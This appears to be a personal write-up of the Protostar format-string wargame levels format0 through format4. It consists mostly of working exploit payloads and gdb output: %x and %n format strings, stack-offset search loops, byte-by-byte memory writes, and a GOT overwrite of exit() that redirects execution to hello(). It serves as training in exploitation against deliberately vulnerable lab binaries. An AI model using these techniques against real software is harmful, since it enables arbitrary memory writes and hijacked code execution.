format0:


# Straight forward buffer overrun

(gdb) run $(python -c "print '%64x' + '\xde\xad\xbe\xef'[::-1]")
Starting program: /opt/protostar/bin/format0 $(python -c "print '%64x' + '\xde\xad\xbe\xef'[::-1]")
you have hit the target correctly :)

Program exited with code 045.
(gdb) 


format1:

# This method is from the shellcoders handbook, and helped me to understand format strings better

for((i=1;i<200;i++)); do echo -n "$i " && ./format1 "AAAA%$i\$x" && echo "" ; done | grep -i 4141
128 AAAA41414100

What we are trying to do is find out where the AAAA string is located in memory, and to do this we use a combination of different format specifiers as well as direct parameter access. If we can find out what parameter AAAA is (ie: by accessing the nth hexadecimal parameter down the stack from the current stack pointer) then we replace the AAAA with either arbitrary addresses for reading from with the %s format specifier, or perform writes to memory locations utilizing the %n format specifier.


Address for the variable we want to change
(gdb) p &target
$1 = (int *) 0x8049638

We have to just write a single byte to trigger the win condition:

./format1 $(python -c "print '\x08\x04\x96\x38'[::-1] + '%10x%131$n'")

for((i=1;i<200;i++)); do echo -n "$i " && ./format1 $(python -c "print '\x08\x04\x96\x38'[::-1] + '%10x%131$n'") ; done

Got stuck, gave up and went onto next one



format2:

target address: 080496e4

user@protostar:/opt/protostar/bin$ for((i=1;i<200;i++)); do echo -n "$i " && echo "ABCD%$i\$x" | ./format2 && echo "" ; done | grep -i 44434241
4 ABCD44434241
ser@protostar:/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08%x%x%x%n"' | ./format2    
200b7fd8420bffffaf4
target is 23 :(
user@protostar:/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08%x%x%49x%n"' | ./format2
200b7fd8420                                         bffffaf4
you have modified the target :)


format3:

target value has to be too high to write all at once, need to write one byte at a time

target address: 080496f4
if(target == 0x01025544)


user@protostar:/opt/protostar/bin$ for((i=1;i<200;i++)); do echo -n "$i " && echo "ABCD%$i\$x" | ./format3 && echo "" ; done | grep -i 44434241
12 ABCD44434241


# So this took some fiddling. (With help from art of exploitation) Each address needs to have a 4 byte junk data between for the %x to pop off the stack.
python -c 'print "\xf4\x96\x04\x08AAAA\xf5\x96\x04\x08BBBB\xf6\x96\x04\x08CCCC\xf7\x96\x04\x08" + "%x"*10 + "%243x%n%17x%n%173x%n%255x%n"' | ./format3


format4:

hello() function pointer: 080484b4
exit() fp:                080483ec

Where can we write to that we can return into hello?
fgets() seems to be properly bounds checked so a buffer overflow probably wont work.

GOT?

objdump -TR format4
...
08049724 R_386_JUMP_SLOT   exit #Address of exit in the GOT

Run the binary and get address of hello function:
(gdb) p &hello
$4 = (void (*)(void)) 0x80484b4 <hello>

user@protostar:/opt/protostar/bin$ for((i=1;i<200;i++)); do echo -n "$i " && echo "ABCD%$i\$x" | ./format2 && echo "" ; done | grep -i 44434241                                                                    
4 ABCD44434241

So we know that our string is located in memory 4 parameters down the stack, we are only going to have room for 2 addresses. And this time we use direct parameter access

(gdb) run <<< $(python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%4$33964x%4$n%5$33616x%5$n"')
Starting program: /opt/protostar/bin/format4 <<< $(python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%4$33964x%4$n%5$33616x%5$n"')

Breakpoint 2, vuln () at format4/format4.c:18
18	in format4/format4.c
(gdb) 
(gdb) c
Continuing.
code execution redirected! you win

Program exited with code 01.
